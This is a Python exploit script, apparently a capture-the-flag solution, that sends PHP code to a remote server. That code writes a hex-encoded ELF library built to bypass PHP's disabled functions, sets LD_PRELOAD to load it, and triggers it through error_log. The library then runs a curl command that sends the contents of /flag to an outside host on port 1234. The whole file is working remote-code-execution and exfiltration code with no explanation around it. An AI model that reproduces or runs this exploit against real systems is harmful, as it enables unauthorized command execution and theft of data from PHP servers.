import requests
payload = """
$file = tmpfile();
var_dump($file);
$path = stream_get_meta_data($file)['uri'];
var_dump($path);
var_dump(fputs($file, pack('H*',$_POST['x'])));
putenv('EVIL_CMDLINE=curl -F "data=@/flag" http://pass.imjuno.com:1234/?x="$(cat /flag)"');putenv('LD_PRELOAD='.$path);error_log('',1);
"""

cookie = {'PHPSESSID': 'asdasdasdasdasd'}
ret = requests.post("http://54.180.143.146/?code=" + payload, cookies=cookie, data={
    'x': '7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000028140000000000000000000040003800060040001c001900010000000500000000000000000000000000000000000000000000000000000004090000000000000409000000000000000020000000000001000000060000000809000000000000080920000000000008092000000000005802000000000000600200000000000000002000000000000200000006000000280900000000000028092000000000002809200000000000c001000000000000c0010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050e57464040000008408000000000000840800000000000084080000000000001c000000000000001c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000040000001400000003000000474e550066bb9e247f3731670b5cdfd534ac53233e576aef00000000030000000d000000010000000600000088c22001001440090d0000000f000000110000004245d5ecbbe3927cd871581cb98df10eead3ef0e6d1287c2000000000000000000000000000000000000000000000000000000000000000003000900380600000000000000000000000000007d00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008b00000012000000000000000000000000000000000000009d00000021000000000000000000000000000000000000000100000020000000000000000000000000000000000000009e00000011000000000000000000000000000000000000006100000020000000000000000000000000000000000000009c0000001100000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000840000001200000000000000000000000000000000000000a600000010001600600b2000000000000000000000000000b900000010001700680b2000000000000000000000000000ad00000010001700600b20000000000000000000000000001000000012000900380600000000000000000000000000001600000012000c00600800000000000000000000000000007500000012000b00c0070000000000009d00000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200000002000200000002000000020000000200020001000100010001000100010001000100920000001000000000000000751a690900000200be00000000000000080920000000000008000000000000009007000000000000180920000000000008000000000000005007000000000000580b2000000000000800000000000000580b200000000000100920000000000001000000120000000000000000000000e80a20000000000006000000030000000000000000000000f00a20000000000006000000060000000000000000000000f80a20000000000006000000070000000000000000000000000b20000000000006000000080000000000000000000000080b200000000000060000000a0000000000000000000000100b200000000000060000000b0000000000000000000000300b20000000000007000000020000000000000000000000380b20000000000007000000040000000000000000000000400b20000000000007000000060000000000000000000000480b200000000000070000000b0000000000000000000000500b200000000000070000000c00000000000000000000004883ec08488b05ad0420004885c07405e8430000004883c408c30000000000000000000000000000ff35ba042000ff25bc0420000f1f4000ff25ba0420006800000000e9e0ffffffff25b20420006801000000e9d0ffffffff25aa0420006802000000e9c0ffffffff25a20420006803000000e9b0ffffffff259a0420006804000000e9a0ffffff488d3d99042000488d0599042000554829f84889e54883f80e7615488b05060420004885c074095dffe0660f1f4400005dc366666666662e0f1f840000000000488d3d59042000488d3552042000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05d90320004885c0740c5dffe0660f1f8400000000005dc366666666662e0f1f840000000000803d0904200000752748833daf03200000554889e5740c488b3dea032000e82dffffffe848ffffff5dc605e003200001f3c366666666662e0f1f840000000000488d3d8901200048833f00750be95effffff660f1f440000488b05510320004885c074e9554889e5ffd05de940ffffff554889e54883ec10488d3d9a000000e89cfeffff488945f0c745fc00000000eb4f488b0510032000488b008b55fc4863d248c1e2034801d0488b00488d35740000004889c7e8a6feffff4885c0741d488b05e2022000488b008b55fc4863d248c1e2034801d0488b00c600008345fc01488b05c1022000488b008b55fc4863d248c1e2034801d0488b004885c07592488b45f04889c7e825feffffc9c30000004883ec084883c408c34556494c5f434d444c494e45004c445f5052454c4f414400000000011b033b1800000002000000dcfdffff340000003cffffff5c0000001400000000000000017a5200017810011b0c070890010000240000001c000000a0fdffff60000000000e10460e184a0f0b770880003f1a3b2a332422000000001c00000044000000d8feffff9d00000000410e108602430d0602980c0708000000000000000000009007000000000000000000000000000050070000000000000000000000000000010000000000000092000000000000000c0000000000000038060000000000000d000000000000006008000000000000190000000000000008092000000000001b0000000000000010000000000000001a0000000000000018092000000000001c000000000000000800000000000000f5feff6f00000000b8010000000000000500000000000000c0030000000000000600000000000000f8010000000000000a00000000000000ca000000000000000b0000000000000018000000000000000300000000000000180b20000000000002000000000000007800000000000000140000000000000007000000000000001700000000000000c0050000000000000700000000000000d0040000000000000800000000000000f00000000000000009000000000000001800000000000000feffff6f00000000b004000000000000ffffff6f000000000100000000000000f0ffff6f000000008a04000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000280920000000000000000000000000000000000000000000760600000000000086060000000000009606000000000000a606000000000000b606000000000000580b2000000000004743433a202844656269616e20342e392e322d31302b6465623875322920342e392e3200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200b80100000000000000000000000000000000000003000300f80100000000000000000000000000000000000003000400c003000000000000000000000000000000000000030005008a0400000000000000000000000000000000000003000600b00400000000000000000000000000000000000003000700d00400000000000000000000000000000000000003000800c00500000000000000000000000000000000000003000900380600000000000000000000000000000000000003000a00600600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00600800000000000000000000000000000000000003000d00690800000000000000000000000000000000000003000e00840800000000000000000000000000000000000003000f00a00800000000000000000000000000000000000003001000080920000000000000000000000000000000000003001100180920000000000000000000000000000000000003001200200920000000000000000000000000000000000003001300280920000000000000000000000000000000000003001400e80a20000000000000000000000000000000000003001500180b20000000000000000000000000000000000003001600580b20000000000000000000000000000000000003001700600b2000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200200920000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00000700000000000000000000000000004100000002000b00500700000000000000000000000000005700000001001700600b20000000000001000000000000006600000001001100180920000000000000000000000000008d00000002000b0090070000000000000000000000000000990000000100100008092000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000cd00000001000f0000090000000000000000000000000000db0000000100120020092000000000000000000000000000000000000400f1ff00000000000000000000000000000000e700000001001600580b2000000000000000000000000000f40000000100130028092000000000000000000000000000fd00000001001600600b20000000000000000000000000000901000001001500180b20000000000000000000000000001f01000012000000000000000000000000000000000000003301000020000000000000000000000000000000000000004f01000010001600600b20000000000000000000000000005601000012000c00600800000000000000000000000000005c01000012000000000000000000000000000000000000007001000020000000000000000000000000000000000000007f01000011000000000000000000000000000000000000009401000010001700680b20000000000000000000000000009901000010001700600b2000000000000000000000000000a501000012000b00c0070000000000009d00000000000000ad0100002000000000000000000000000000000000000000c10100001100000000000000000000000000000000000000d80100002000000000000000000000000000000000000000f201000022000000000000000000000000000000000000000e02000012000900380600000000000000000000000000001402000012000000000000000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e36363730005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006279706173735f64697361626c6566756e632e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f00656e7669726f6e4040474c4942435f322e322e35005f656e64005f5f6273735f7374617274007072656c6f6164005f4a765f5265676973746572436c6173736573005f5f656e7669726f6e4040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e6974007374727374724040474c4942435f322e322e3500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000b801000000000000b8010000000000003c00000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000f801000000000000f801000000000000c80100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c003000000000000c003000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000008a040000000000008a04000000000000260000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b004000000000000b004000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d004000000000000d004000000000000f0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000c005000000000000c0050000000000007800000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000380600000000000038060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000006006000000000000600600000000000060000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c0060000000000009d01000000000000000000000000000010000000000000000000000000000000840000000100000006000000000000006008000000000000600800000000000009000000000000000000000000000000040000000000000000000000000000008a00000001000000020000000000000069080000000000006908000000000000180000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000840800000000000084080000000000001c00000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000a008000000000000a0080000000000006400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000080920000000000008090000000000001000000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000180920000000000018090000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000200920000000000020090000000000000800000000000000000000000000000008000000000000000000000000000000c700000006000000030000000000000028092000000000002809000000000000c001000000000000040000000000000008000000000000001000000000000000d0000000010000000300000000000000e80a200000000000e80a0000000000003000000000000000000000000000000008000000000000000800000000000000d5000000010000000300000000000000180b200000000000180b0000000000004000000000000000000000000000000008000000000000000800000000000000de000000010000000300000000000000580b200000000000580b0000000000000800000000000000000000000000000008000000000000000000000000000000e4000000080000000300000000000000600b200000000000600b0000000000000800000000000000000000000000000001000000000000000000000000000000e90000000100000030000000000000000000000000000000600b0000000000002400000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000840b000000000000f200000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000780c00000000000088050000000000001b0000002b0000000800000000000000180000000000000009000000030000000000000000000000000000000000000000120000000000002802000000000000000000000000000001000000000000000000000000000000'
    })

print(ret)
print(ret.headers)
print(ret.text)
